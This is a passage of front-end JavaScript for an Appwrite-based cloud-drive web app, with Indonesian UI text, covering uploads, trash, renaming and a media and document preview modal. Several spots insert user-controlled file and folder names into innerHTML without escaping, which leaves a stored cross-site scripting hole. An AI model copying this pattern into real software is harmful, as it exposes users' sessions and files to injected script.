    try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false }); loadFiles(currentFolderId); el('newFolderName').value = ''; } catch (e) { alert(e.message); } finally { toggleLoading(false); }
};

window.submitUploadFile = async () => {
    if (!selectedUploadFile) return alert("Pilih file dulu!"); closeModal('uploadModal'); toggleLoading(true, "Mengunggah...");
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: storage.getFileView(CONFIG.BUCKET_ID, up.$id).href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false });
        resetUploadUI(); loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { toggleLoading(false); }
};

window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); closeAllMenus(); } catch(e){} };
window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); closeAllMenus(); } catch(e){} };
window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); closeAllMenus(); } catch(e){} };
window.deleteItemPermanently = async () => { if(!confirm("Hapus permanen? Data tidak bisa kembali!")) return; try { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); closeAllMenus(); } catch(e){} };
window.openCurrentItem = () => { if(selectedItem) selectedItem.type==='folder' ? openFolder(selectedItem.$id, selectedItem.name) : openPreview(selectedItem); closeAllMenus(); };
window.downloadCurrentItem = () => { if(selectedItem && selectedItem.type!=='folder') window.open(storage.getFileDownload(CONFIG.BUCKET_ID, selectedItem.fileId), '_blank'); closeAllMenus(); };
window.renameCurrentItem = async () => { const newName = prompt("Nama baru:", selectedItem.name); if(newName) { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, {name: newName}); loadFiles(currentFolderId); } closeAllMenus(); };

function resetUploadUI() { selectedUploadFile = null; el('fileInfoContainer').classList.add('hidden'); el('fileInputHidden').value = ''; }
function handleFileSelect(file) { selectedUploadFile = file; el('fileInfoText').innerText = `Terpilih: ${file.name}`; el('fileInfoContainer').classList.remove('hidden'); }
function initDragAndDrop() {
    const zone = el('dropZone'); const input = el('fileInputHidden'); if (!zone) return;
    zone.addEventListener('dragover', (e) => { e.preventDefault(); zone.classList.add('active'); });
    zone.addEventListener('dragleave', () => zone.classList.remove('active')); 
    zone.addEventListener('drop', (e) => { e.preventDefault(); zone.classList.remove('active'); if(e.dataTransfer.files.length > 0) handleFileSelect(e.dataTransfer.files[0]); });
    if(input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); });
}

async function loadFiles(param) { 
    if (!currentUser) return; 
    const grid = el('fileGrid'); grid.innerHTML = ''; updateHeaderUI(); 
    let queries = [Appwrite.Query.equal('owner', currentUser.$id)]; 
    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false)); 
    else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false)); 
    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true)); 
    else { 
        if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param; 
        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false)); 
    } 
    try { 
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries); 
        
        // Simpan semua list file untuk navigasi Next / Previous Media Player
        updatePreviewList(res.documents);

        if (res.documents.length === 0) {
            grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.6;margin-top:50px;">
                                <div class="mac-folder-icon" style="transform: scale(1.2); margin-bottom:25px; filter: grayscale(100%); opacity: 0.5;">
                                    <div class="mac-folder-back"></div>
                                    <div class="mac-folder-front"></div>
                                </div>
                                <p>Folder Kosong</p>
                              </div>`; 
        } else {
            res.documents.forEach(doc => renderItem(doc)); 
        }
    } catch (e) { console.error(e); } 
}

function updateHeaderUI() { 
    const container = document.querySelector('.breadcrumb-area'); const isRoot = currentFolderId === 'root' && currentViewMode === 'root'; 
    if (isRoot) { 
        const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night"; 
        container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`; 
    } else { 
        container.innerHTML = `<div class="back-nav-container"><button onclick="goBack()" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Kembali ke Drive</button><h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2></div>`; 
    } 
}

window.togglePass = (id, icon) => { const input = document.getElementById(id); if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } };

// ======================================================
// 9. LOGIKA PRATINJAU FILE & NAVIGASI NEXT/PREV
// ======================================================
let currentPreviewDoc = null;
let hideOverlayTimeout;

window.openPreview = (doc) => {
    currentPreviewDoc = doc;
    const ext = doc.name.split('.').pop().toLowerCase();
    
    // Logika Navigasi Next/Prev Panah Apple Glass
    let currentIndex = currentPreviewList.findIndex(d => d.$id === doc.$id);
    if(currentIndex === -1) { currentPreviewList = [doc]; currentIndex = 0; }

    const prevBtn = el('previewPrevBtn');
    const nextBtn = el('previewNextBtn');
    
    if(prevBtn && nextBtn) {
        if(currentPreviewList.length <= 1) {
            prevBtn.classList.add('hidden'); nextBtn.classList.add('hidden');
        } else {
            currentIndex > 0 ? prevBtn.classList.remove('hidden') : prevBtn.classList.add('hidden');
            currentIndex < currentPreviewList.length - 1 ? nextBtn.classList.remove('hidden') : nextBtn.classList.add('hidden');
        }
    }

    const fileViewUrl = storage.getFileView(CONFIG.BUCKET_ID, doc.fileId).href || storage.getFileView(CONFIG.BUCKET_ID, doc.fileId);
    const fileDownloadUrl = storage.getFileDownload(CONFIG.BUCKET_ID, doc.fileId).href || storage.getFileDownload(CONFIG.BUCKET_ID, doc.fileId);

    el('previewFileName').innerText = doc.name;

    let iconClass = "fa-file"; let iconColor = "#ffffff";
    const pdfExt = ['pdf']; 
    const msOfficeExts = ['doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx']; 
    const otherDocs = ['csv', 'txt', 'rtf'];
    const familiarImages = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'jfif', 'tiff', 'tif', 'heif', 'heic', 'raw', 'ico']; 
    const vidExts = ['mp4', 'webm', 'ogg', 'mov', 'mkv', 'avi', 'wmv', 'flv', '3gp', 'mpg', 'mpeg', 'avchd', 'm2ts'];

    if (pdfExt.includes(ext)) { iconClass = "fa-file-pdf"; iconColor = "#ea4335"; }
    else if (ext.includes('doc')) { iconClass = "fa-file-word"; iconColor = "#4285f4"; }
    else if (ext.includes('xls') || ext.includes('csv')) { iconClass = "fa-file-excel"; iconColor = "#34a853"; }
    else if (ext.includes('ppt')) { iconClass = "fa-file-powerpoint"; iconColor = "#fbbc04"; }
    else if (familiarImages.includes(ext)) { iconClass = "fa-file-image"; iconColor = "#2dd4bf"; }
    else if (vidExts.includes(ext)) { iconClass = "fa-file-video"; iconColor = "#facc15"; }

    const iconEl = el('previewFileIcon');
    iconEl.className = `fa-solid ${iconClass}`;
    iconEl.style.color = iconColor;

    const contentArea = el('previewContent');
    contentArea.innerHTML = '<div class="spinner"></div>';

    const overlay = el('previewModal');
    overlay.classList.remove('hidden');
    setTimeout(() => overlay.classList.add('show-preview'), 10);

    setTimeout(() => {
        if (familiarImages.includes(ext)) {
            contentArea.innerHTML = `<img src="${fileViewUrl}" alt="${doc.name}" loading="lazy">`;
        } 
        else if (vidExts.includes(ext)) {
            // STRUKTUR HTML BARU: APPLE THEATER VIDEO PLAYER DENGAN SVG SKIP ORIGINAL & PURE GLASS
            contentArea.innerHTML = `
                <div class="apple-video-wrapper" id="vidContainer">
                    <video src="${fileViewUrl}" id="customVideo" playsinline autoplay></video>
                    
                    <div class="apple-video-overlay" id="vidOverlay">
                        <div class="apple-top-controls">
                            <div class="placeholder-top-left" style="width:40px"></div>
                            
                            <div class="top-right-group">
                                <div class="apple-volume-container pure-glass" id="vidVolumeContainer">
                                    <button class="icon-only-btn volume-icon-btn" id="vidMute" title="Mute/Unmute">
                                        <i class="fa-solid fa-volume-high"></i>
                                    </button>
                                    <div class="volume-slider-wrapper">
                                        <input type="range" id="vidVolumeSlider" class="apple-volume-slider" min="0" max="1" step="0.01" value="1" style="--vol: 100%;">
                                    </div>
                                </div>
                                <button class="apple-glass-btn pure-glass small" id="vidFullscreen" title="Layar Penuh"><i class="fa-solid fa-expand"></i></button>
                            </div>
                        </div>

                        <div class="apple-center-controls">
                            <button class="apple-glass-btn pure-glass" id="vidSkipBack" title="Mundur 10 detik" style="padding: 12px;">
                                <svg width="100%" height="100%" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M6.343 6.343C4.843 7.843 4 9.878 4 12C4 16.418 7.582 20 12 20C16.418 20 20 16.418 20 12C20 7.582 16.418 4 12 4C10.014 4 8.205 4.764 6.834 6" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
                                    <path d="M4 3V7H8" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
                                    <text x="12" y="15.5" text-anchor="middle" font-size="8" font-weight="bold" font-family="system-ui, -apple-system, sans-serif" fill="white" stroke="none">10</text>
                                </svg>
                            </button>
                            
                            <button class="apple-glass-btn play-pause-btn pure-glass" id="vidPlayPause" title="Play/Pause">
                                <i class="fa-solid fa-pause"></i>
                            </button>
                            
                            <button class="apple-glass-btn pure-glass" id="vidSkipForward" title="Maju 10 detik" style="padding: 12px;">
                                <svg width="100%" height="100%" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M17.657 6.343C19.157 7.843 20 9.878 20 12C20 16.418 16.418 20 12 20C7.582 20 4 16.418 4 12C4 7.582 7.582 4 12 4C13.987 4 15.796 4.764 17.166 6" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
                                    <path d="M20 3V7H16" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
                                    <text x="12" y="15.5" text-anchor="middle" font-size="8" font-weight="bold" font-family="system-ui, -apple-system, sans-serif" fill="white" stroke="none">10</text>
                                </svg>
                            </button>
                        </div>

                        <div class="apple-bottom-pill pure-glass">
                            <span class="apple-time" id="vidCurrentTime">0:00</span>
                            <div class="apple-progress-container" id="vidProgressContainer">
                                <div class="apple-progress-bar" id="vidProgressBar"><div class="apple-progress-thumb"></div></div>
                            </div>
                            <span class="apple-time" id="vidDuration">-0:00</span>
                        </div>
                    </div>
                </div>
            `;
            setTimeout(initCustomVideoPlayer, 50); 
        } 
        else if (pdfExt.includes(ext)) {
            contentArea.innerHTML = `<div class="doc-glass-wrapper"><iframe src="${fileViewUrl}"></iframe></div>`;
        } 
        else if (msOfficeExts.includes(ext) || otherDocs.includes(ext)) {
            let viewerUrl = '';
            if (msOfficeExts.includes(ext)) { viewerUrl = `https://view.officeapps.live.com/op/embed.aspx?src=${encodeURIComponent(fileDownloadUrl)}`; } 
            else { viewerUrl = `https://docs.google.com/viewer?url=${encodeURIComponent(fileDownloadUrl)}&embedded=true`; }
            contentArea.innerHTML = `<div class="doc-glass-wrapper"><iframe src="${viewerUrl}"></iframe></div>`;
        } 
        else {
            contentArea.innerHTML = `
                <div class="preview-unsupported">
                    <i class="fa-solid ${iconClass}"></i>
                    <p>Pratinjau langsung tidak tersedia untuk format file ini.</p>
                    <button class="btn-pill primary" style="width:auto; padding:0 30px;" onclick="downloadPreviewItem()">Download File</button>
                </div>
            `;
        }
    }, 400); 
};

// Fungsi Navigasi Gallery Preview
window.navigatePreview = (direction) => {
    if (!currentPreviewDoc) return;
    const currentIndex = currentPreviewList.findIndex(d => d.$id === currentPreviewDoc.$id);
    const newIndex = currentIndex + direction;
    
    if (newIndex >= 0 && newIndex < currentPreviewList.length) {
        // Matikan video jika sedang menyala agar suara tidak bocor
        const video = el('customVideo');
        if(video) { video.pause(); video.removeAttribute('src'); video.load(); }
        
        el('previewContent').innerHTML = '<div class="spinner"></div>';
        openPreview(currentPreviewList[newIndex]);
    }
};

window.initCustomVideoPlayer = () => {
    const video = el('customVideo');
    const playPauseBtn = el('vidPlayPause');
    const skipBackBtn = el('vidSkipBack');
    const skipForwardBtn = el('vidSkipForward');
    const progressContainer = el('vidProgressContainer');
    const progressBar = el('vidProgressBar');
    const timeDisplay = el('vidCurrentTime');
    const durationDisplay = el('vidDuration');
    const muteBtn = el('vidMute');
    const volumeSlider = el('vidVolumeSlider');
    const fullscreenBtn = el('vidFullscreen');
    const vidContainer = el('vidContainer');
    const overlayVid = el('vidOverlay');

    if(!video) return;

    const formatTime = (seconds) => {
        if(isNaN(seconds)) return "0:00";
        const m = Math.floor(Math.abs(seconds) / 60); 
        const s = Math.floor(Math.abs(seconds) % 60);
        return `${m}:${s < 10 ? '0' : ''}${s}`;
    };

    video.addEventListener('loadedmetadata', () => { 
        timeDisplay.innerText = "0:00";
        durationDisplay.innerText = `-${formatTime(video.duration)}`; 
    });

    video.addEventListener('timeupdate', () => {
        const percent = (video.currentTime / video.duration) * 100;
        progressBar.style.width = `${percent}%`;
        timeDisplay.innerText = formatTime(video.currentTime);
        const timeRemaining = video.duration - video.currentTime;
        durationDisplay.innerText = `-${formatTime(timeRemaining)}`;
    });

    video.addEventListener('ended', () => {
        playPauseBtn.innerHTML = '<i class="fa-solid fa-play" style="margin-left: 5px;"></i>';
        if (overlayVid) overlayVid.style.opacity = '1';
        clearTimeout(hideOverlayTimeout);
    });

    const togglePlay = () => {
        if (video.paused || video.ended) { 
            video.play(); 
            playPauseBtn.innerHTML = '<i class="fa-solid fa-pause"></i>'; 
        } else { 
            video.pause(); 
            playPauseBtn.innerHTML = '<i class="fa-solid fa-play" style="margin-left: 5px;"></i>'; 
        }
    };
    playPauseBtn.addEventListener('click', togglePlay);
    video.addEventListener('click', togglePlay);

    skipBackBtn.addEventListener('click', () => { video.currentTime -= 10; });
    skipForwardBtn.addEventListener('click', () => { video.currentTime += 10; });

    progressContainer.addEventListener('click', (e) => {
        const rect = progressContainer.getBoundingClientRect();
        const pos = (e.clientX - rect.left) / rect.width;
        video.currentTime = pos * video.duration;
    });

    const updateMuteIcon = (vol) => {
        if(vol === 0 || video.muted) muteBtn.innerHTML = '<i class="fa-solid fa-volume-xmark"></i>';
        else if(vol < 0.5) muteBtn.innerHTML = '<i class="fa-solid fa-volume-low"></i>';
        else muteBtn.innerHTML = '<i class="fa-solid fa-volume-high"></i>';
    };

    if(volumeSlider) {
        volumeSlider.addEventListener('input', (e) => {
            const vol = parseFloat(e.target.value);
            video.volume = vol;
            video.muted = (vol === 0);
            volumeSlider.style.setProperty('--vol', (vol * 100) + '%');
            updateMuteIcon(vol);
        });
    }

    muteBtn.addEventListener('click', () => {
        video.muted = !video.muted;
        if(video.muted) {
            if(volumeSlider) { volumeSlider.value = 0; volumeSlider.style.setProperty('--vol', '0%'); }
        } else {
            const currentVol = video.volume > 0 ? video.volume : 1;
            video.volume = currentVol;
            if(volumeSlider) { volumeSlider.value = currentVol; volumeSlider.style.setProperty('--vol', (currentVol * 100) + '%'); }
        }
        updateMuteIcon(video.muted ? 0 : video.volume);
    });

    fullscreenBtn.addEventListener('click', () => {
        if (!document.fullscreenElement) { vidContainer.requestFullscreen().catch(err => {}); }
        else { document.exitFullscreen(); }
    });

    const resetHideTimeout = () => {
        if(!overlayVid) return;
        overlayVid.style.opacity = '1';
        clearTimeout(hideOverlayTimeout);
        hideOverlayTimeout = setTimeout(() => {
            if(!video.paused) overlayVid.style.opacity = '0';
        }, 2500);
    };

    vidContainer.addEventListener('mousemove', resetHideTimeout);
    vidContainer.addEventListener('touchstart', resetHideTimeout);
    vidContainer.addEventListener('click', resetHideTimeout);
    video.addEventListener('play', resetHideTimeout);
    video.addEventListener('pause', () => { 
        overlayVid.style.opacity = '1'; 
        clearTimeout(hideOverlayTimeout); 
    });
};

window.closePreview = () => {
    const overlay = el('previewModal');
    const video = el('customVideo');
    if(video) { video.pause(); video.removeAttribute('src'); video.load(); } 
    overlay.classList.remove('show-preview');
    
    setTimeout(() => {
        overlay.classList.add('hidden');
        el('previewContent').innerHTML = ''; 
        currentPreviewDoc = null;
        clearTimeout(hideOverlayTimeout);
    }, 350);
};

window.downloadPreviewItem = () => {
    if (currentPreviewDoc) {
        window.open(storage.getFileDownload(CONFIG.BUCKET_ID, currentPreviewDoc.fileId), '_blank');
    }
};

window.togglePreviewMenu = () => {
    const menu = el('previewContextMenu');
    menu.classList.toggle('hidden');
};

window.openPreviewInNewTab = () => {
    if (currentPreviewDoc) {
        const fileViewUrl = storage.getFileView(CONFIG.BUCKET_ID, currentPreviewDoc.fileId).href || storage.getFileView(CONFIG.BUCKET_ID, currentPreviewDoc.fileId);
        window.open(fileViewUrl, '_blank');
        el('previewContextMenu').classList.add('hidden');
        closePreview();
    }
};